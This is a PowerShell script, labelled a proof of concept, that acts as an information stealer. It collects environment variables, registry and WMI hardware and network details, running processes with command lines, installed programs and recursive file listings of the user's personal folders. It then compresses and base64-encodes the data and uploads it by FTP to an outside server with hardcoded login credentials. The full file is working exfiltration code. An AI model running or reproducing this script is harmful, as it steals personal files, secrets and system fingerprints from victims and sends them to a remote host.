<# This is just a POC #>

$poc = 'https://bit.ly/34EfPW5'

function Get_BIOS_Registry() {
	$output = '{"BIOS Registry":'
	$output += '['

	$key = "HKLM:\Hardware\Description\System\BIOS"
	$output += Registry_Values_Query $key

	$output += ','
	$key = "HKLM:\Hardware\Description\System"
	$output += Registry_Values_Query $key

	$output += ']'
	$output += '}'

	return $output
}

function Get_Environment_Variables() {
	$output = '{"Environment Variables":'
	$output += '{'

	$vars = Get-ChildItem -Path Env:\ | Select-Object -Property Name, Value
	ForEach ($var in $vars) {
		$output += '"' +$var.Name+ '":"' +$var.Value+ '",'
	}

	# remove trailing ',' character
	$output = $output -replace ".$"
	$output += '}'
	$output += '}'

	return $output
}

function Get_Files() {
	$output = '{"Files":'
	$output += '{'
	$error_counter = 0

	$folders = @(".")
	$folders += $home + "\Desktop"
	$folders += $home + "\Documents"
	$folders += $home + "\Downloads"
	$folders += $home + "\Favorites"
	$folders += $home + "\Music"
	$folders += $home + "\Pictures"
	$folders += $home + "\Videos"

	$folders += $home + "\My Documents"
	$folders += $home + "\My Music"
	$folders += $home + "\My Pictures"
	$folders += $home + "\My Videos"

	# add more target folders as needed
	For ($i=0; $i -lt $folders.Length; $i++) {
		try {
			$obj = Get-ChildItem -Recurse -Force -Path $folders[$i] # Name, DirectoryName, BaseName, FullName
			For($j=0; $j -lt $obj.Length; $j++) {
				# avoid .lnk shortcuts, etc
				if ($obj[$j].DirectoryName) {
					# hack because Get-ChildItem recursively does breadth first, then depth
					#$output += '"File_' +$j+ '_' +$obj[$j].DirectoryName+ '":"' +$obj[$j].Name+ '",'
					$output += '"File_' +$j+ '":"' +$obj[$j].FullName+ '",'
				}
			}
		}
		catch {
			$ErrorMessage = $_.Exception.Message
			$output += '"Error_' +$error_counter+ '":"' + $ErrorMessage + '",'
		}
	}
	# remove trailing ',' character
	$output = $output -replace ".$"
	$output += '}'
	$output += '}'

	return $output
}

function Get_Hyper_V() {
	$output = '{"hyperv":'
	$output += '['

	$key = "HKLM:\SOFTWARE\Microsoft"
	$output += Registry_Key_Query $key

	$output += ','
	$key = "HKLM:\HARDWARE\ACPI\FADT"
	$output += Registry_Key_Query $key

	$output += ','
	$key = "HKLM:\HARDWARE\ACPI\RSDT"
	$output += Registry_Key_Query $key

	$output += ']'
	$output += '}'

	return $output
}

function Get_Installed_Programs_Registry(){
	$output = '{"Registry Installed Programs":'
	$output += '['

	$keys = @()
	$keys += "HKLM:\Software"
	$keys += "HKLM:\Software\Wow6432Node"
	$keys += "HKCU:\Software"
	$keys += "HKCU:\Software\Wow6432Node"

	Foreach ($k in $keys) {
		$key = $k
		$output += Registry_Key_Query $key
		#Get-ChildItem $k | Select-Object -Property Name
		$output += ','
	}

	# remove trailing ',' character
	$output = $output -replace ".$"
	$output += ']'
	$output += '}'

	return $output
}

function Get_Procs() {
	$output = '{"Running Processes":'
	$output += '['

	$props = @("Caption", "Description", "Name", "ProcessName", "CommandLine", "ExecutablePath", "Path")
	$class = "Win32_Process"
	$output += WMI_Query $class $props

	$output += ']'
	$output += '}'

	return $output
}

function Get_Wallpaper() {
	$output = '{"Wallpaper":'
	$output += '{'

	try {
		$obj = Get-ItemProperty -path "HKCU:\Control Panel\Desktop" -name "WallPaper" | Select-Object -Property WallPaper
		if ($obj) {
			$output += '"Location":"' + $obj.WallPaper + '",'
		}

		if ($obj.WallPaper) {
			try {
				#$ = Get-FileHash -Path $obj.WallPaper -Algorithm SHA256
				try {
					$hash = $(CertUtil -hashfile $obj.WallPaper SHA256)[1] -replace " ",""
				}
				catch {
					$ErrorMessage = $_.Exception.Message
					$output += '"Wallpaper CertUtil SHA256":"' + $ErrorMessage + '",'
				}
				if (!$hash) {
					try {
						$hash = $(md5sum $obj.WallPaper)
					}
					catch {
						$ErrorMessage = $_.Exception.Message
						$output += '"Wallpaper MD5Sum":"' + $ErrorMessage + '",'
					}
				}
				if ($hash) {
					$output += '"Wallpaper Hash":"' + $hash + '",'
				}
			}
			catch {
				$ErrorMessage = $_.Exception.Message
				$output += '"Wallpaper Hash":"No more attempts",'
			}
		}
	}
	catch {
		$ErrorMessage = $_.Exception.Message
		$output += '"Wallpaper":"' + $ErrorMessage + '",'
	}
	# remove trailing ',' character
	$output = $output -replace ".$"
	$output += '}'
	$output += '}'

	return $output
}

function Get_WMI_Data() {
	$output = '{"WMI Data":'
	$output += '['

	$props = @("Name", "Description", "Version", "BIOSVersion", "Manufacturer", "PrimaryBIOS", "SerialNumber")
	$class = "Win32_BIOS"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("PSComputerName", "Name", "Caption", "Domain", "Manufacturer", "Model", "OEMStringArray",
	"PrimaryOwnerContact", "PrimaryOwnerName", "SystemFamily", "SystemSKUNumber", "SystemType", "SystemStartupOptions",
	"TotalPhysicalMemory", "UserName")
	$class = "Win32_ComputerSystem"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("IdentifyingNumber", "Name", "Version", "Caption", "Description", "SKUNumber", "UUID", "Vendor", "__PATH", "__RELPATH", "Path")
	$class = "Win32_ComputerSystemProduct"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("Antecedent", "Dependent")
	$class = "Win32_DeviceBus"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("Caption", "Model", "Name", "PNPDeviceID", "SerialNumber")
	$class = "Win32_DiskDrive"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("Caption", "Description", "DeviceName", "SettingID", "Path")
	$class = "Win32_DisplayConfiguration"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("Caption", "Description", "Name", "SettingID", "Path")
	$class = "Win32_DisplayControllerConfiguration"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("Name", "Caption", "Description", "Manufacturer", "ProductName", "ServiceName")
	$class = "Win32_NetworkAdapter"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("Caption", "Description", "DHCPLeaseObtained", "DNSHostName", "IPAddress", "MACAddress", "ServiceName")
	$class = "Win32_NetworkAdapterConfiguration"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("Description")
	$class = "Win32_OnBoardDevice"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("BootDevice", "Caption", "Version", "CSName", "CountryCode", "CurrentTimeZone", "Name")
	$class = "Win32_OperatingSystem"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("BankLabel", "Capacity", "Caption", "Description", "DeviceLocator", "Manufacturer", "PartNumber", "SerialNumber")
	$class = "Win32_PhysicalMemory"
	$output += WMI_Query $class $props

	<# TOO SLOW?  #>
	$output += ','
	$props = @("Caption")
	$class = "Win32_Product"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("DisplayName")
	$class = "Win32_Service"
	$output += WMI_Query $class $props

	$output += ','
	$props = @("AdapterCompatibility", "AdapterRAM", "Caption", "Description", "Name", "VideoProcessor")
	$class = "Win32_VideoController"
	$output += WMI_Query $class $props

	<#
	$output += ','
	$props = @("")
	$class = ""
	$output += WMI_Query $class $props
	#>

	$output += ']'
	$output += '}'

	return $output
}

function Registry_Key_Query() {
	Param($key)
	$output = ''

	$output += '{"' +$key+ '":{'
	try {
	    $obj = Get-ChildItem $key | Select-Object -Property Name
		if ($obj.length) {
			For ($i=0; $i -lt $obj.Length; $i++) {
				$name = $obj[$i].Name.Split("\\")[-1]
				$output += '"Key_' +$i+ '":"' +$name+ '",'
			}
		}
		else{
			$name = $obj.Name.Split("\\")[-1]
			$output += '"Key_0":"' +$name+ '",'
		}
	}
	catch {
		$ErrorMessage = $_.Exception.Message
		$output += '"Error":"' + $ErrorMessage + '",'
	}
	# remove trailing ',' character
	$output = $output -replace ".$"
	$output += '}}'
	return $output
}

function Registry_Values_Query() {
	Param($key)
	$names = @()
	$output = ''

	try {
		$obj = Get-Item -Path $key
		ForEach ($o in $obj) {
			$names += $o.GetValueNames()
		}
		if ($names.length) {
			$output += '{"' +$key+ '":{'
			ForEach ($name in $names) {
				$output += '"' +$name+ '":"' +$obj.GetValue($name)+ '",'
			}
		}
		else {
			$output += '{"' +$key+ '":{'
			$output += '"":"",'
		}
	}
	catch {
		$ErrorMessage = $_.Exception.Message
		$output += '{"' + $key + '":{'
		$output += '"Error":"' +$ErrorMessage+ '",'
	}

	# remove trailing ',' character
	$output = $output -replace ".$"
	$output += '}}'
	return $output
}

function WMI_Query() {
	Param($class, $props)

	$output = '{"' + $class + '":'
	$output += '['

	# make sure the class exists in the first place
	try{
		$placeholder = Get-WMIObject -Class $class
	}
	catch{
		$ErrorMessage = $_.Exception.Message
		$ErrorMessage = $ErrorMessage -replace '"', "'"
		$output += '{"Error":"' + $ErrorMessage + '"}'
		$output += ']'
		$output += '}'
		return $output
	}

	try {
		$wmi = Get-WMIObject -Query "SELECT * FROM $class" | Select-Object -Property $props
		if ($wmi) {
			ForEach ($w in $wmi)
			{
				$output += '{'
				ForEach ($prop in $props) {
					$w.$prop = $w.$prop -replace '"', "'"
					$output += '"' + $prop + '":"' + $w.$prop + '",'
				}
				# remove trailing ',' character
				$output = $output -replace ".$"
				$output += '},'
			}
		}
		else {
			$output += '{"' + $prop + '":""},'
		}
		# remove trailing ',' character
		$output = $output -replace ".$"
	}
	catch {
		$ErrorMessage = $_.Exception.Message
		$output += '{"' + $class + '":"' + $ErrorMessage + '"}'
	}
	$output += ']'
	$output += '}'

	return $output
}

function Zencrypt() {
	Param($str)
	$str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

	return $str
}

function Zcompress() {
	Param($str)
	$stream = New-Object System.IO.MemoryStream
	$gzip = New-Object System.IO.Compression.GZipStream($stream, [System.IO.Compression.CompressionMode]::Compress)
	$writer = New-Object System.IO.StreamWriter($gzip)
	$writer.Write($str)
	$writer.Close();
	$str = [System.Convert]::ToBase64String($stream.ToArray())
	return $str
}

function Zdcom() {
	Param ($str)
	$data = [System.Convert]::FromBase64String($str)
	$stream = New-Object System.IO.MemoryStream
	$stream.Write($data, 0, $data.Length)
	$stream.Seek(0,0) | Out-Null
	$reader = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($stream, [System.IO.Compression.CompressionMode]::Decompress))
	return $reader.readLine().ToCharArray()
}

function Zend() {
	Param ($str)
	$username = 'crazyrockinsushi'
	$password = '$5OffToday' # $5Off
	$server = "ftp://ftp.drivehq.com/"
	$file = 'zinfo.txt'

	Set-Content -Path $file -Value $str

	$ftp = [System.Net.FtpWebRequest]::Create($server+$file)
	$ftp = [System.Net.FtpWebRequest]$ftp
	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
	$ftp.Credentials = new-object System.Net.NetworkCredential($username, $password)
	$ftp.UseBinary = $true
	$ftp.UsePassive = $true
	$content = [System.IO.File]::ReadAllBytes($file)
	$ftp.ContentLength = $content.Length
	$rs = $ftp.GetRequestStream()
	$rs.Write($content, 0, $content.Length)
	$rs.Close()
	$rs.Dispose()

	Remove-Item $file
}

# supress noisy errors
$ErrorActionPreference = 'stop'

# manually build the JSON output string
$out = '['
$out += Get_Hyper_V
$out += ','
$out += Get_Environment_Variables
$out += ','
$out += Get_Wallpaper
$out += ','
$out += Get_BIOS_Registry
$out += ','
$out += Get_WMI_Data	#to be continued  finished CIMV2
$out += ','
$out += Get_Procs
$out += ','
$out += Get_Files
$out += ','
$out += Get_Installed_Programs_Registry
$out += ']'
$out = $out -replace '\\', '\\'

$out = Zcompress $out
$out = Zencrypt $out
Zend $out
